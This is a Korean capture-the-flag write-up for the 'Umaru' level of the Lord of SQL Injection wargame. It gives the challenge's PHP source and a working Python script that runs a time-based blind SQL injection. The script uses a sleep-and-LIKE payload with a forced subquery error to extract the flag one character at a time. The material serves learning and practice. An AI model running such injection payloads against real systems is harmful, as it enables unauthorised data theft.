---
layout: default
title: Umaru
parent: Load Of SQL Injection
nav_order: 25
---

# Umaru

Time Based Blind SQL Injection을 이용해 Flag를 구하면 되는 문제다.

하지만 쿼리의 결과값이 True가 아닐경우 Flag가 초기화 되도록 프로그래밍 되어있다.

Time Based Blind SQL Injection을 진행하는 동안 Flag가 초기화 되지 않도록 해야한다.

쿼리의 결과값이 False일 경우 Error가 나도록 하는 쿼리를 작성하면 Flag를 초기화 시키지 않고 구할 수 있다.
 
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();

  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }

  if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

  if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
  if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
  if(strlen($_GET[flag])>100) exit("HeHe");

  $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

  @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
  @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

  $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
  if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

  if($realflag[flag] === $_GET[flag]) solve("umaru");
?>
```

python으로 툴을 짜 flag를 구할 수 있다.

```python
import urllib, urllib2, cookielib, re, time
key=''
length=16
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'search key.'
lenck=1
while 1:
    subkey = 47
    for x in range(80):
        subkey=subkey+1
        chrkey=chr(subkey);
        if chrkey=="%":
            continue
        if 58<= subkey <=64:
            continue
        if 91 <= subkey <=96:
            continue
        url = "https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=sleep((flag%%20like%%20%%27%s%%%%27)*7)%%20or%%20(select%%201%%20union%%20select%%202)" % (
        key + chrkey)
        print url
        stime=time.time()
        resp=opener.open(url)
        rresp=resp.read()
        etime=time.time()
        if (etime-stime)>5:
            print 'find'
            key=key+chrkey
            print key
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```